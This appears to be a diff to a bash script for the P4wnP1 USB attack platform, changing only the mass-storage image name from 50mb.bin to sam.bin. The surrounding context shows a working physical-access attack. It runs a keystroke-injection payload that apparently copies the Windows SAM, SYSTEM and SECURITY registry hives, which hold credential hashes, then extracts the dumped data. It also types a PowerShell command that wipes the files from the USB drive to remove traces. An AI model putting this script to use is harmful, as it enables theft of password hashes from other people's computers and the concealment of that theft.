@@ -11,7 +11,7 @@
 # Create a trigger to start this bash script when USB gadget connected to host
 
 echo "[*] Checking for mass storage..."
-if [ ! -f /usr/local/P4wnP1/ums/flashdrive/50mb.bin ]; then
+if [ ! -f /usr/local/P4wnP1/ums/flashdrive/sam.bin ]; then
     echo "[!] Mass storage not found, Please create one using genimg"
     exit 1
   fi
@@ -81,7 +81,7 @@ echo "[*] Executing HID Attack..."
 P4wnP1_cli hid run -n extract-sam-system-security.js >/dev/null
 sleep 5
 echo "[*] Extracting data from mass storage..."
-7z x /usr/local/P4wnP1/ums/flashdrive/50mb.bin -o/tmp/samdata/ >/dev/null
+7z x /usr/local/P4wnP1/ums/flashdrive/sam.bin -o/tmp/samdata/ >/dev/null
 sleep 5
 echo "[*] Deleting files from mass storage..."
 P4wnP1_cli hid run -c 'layout("us"); press("GUI r"); delay(500); type("powershell\n"); delay(1000); type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq \"sam\" } | select name;$drive = $usbPath.name;Remove-Item $drive\\*.*\n");type("exit\n")' >/dev/null
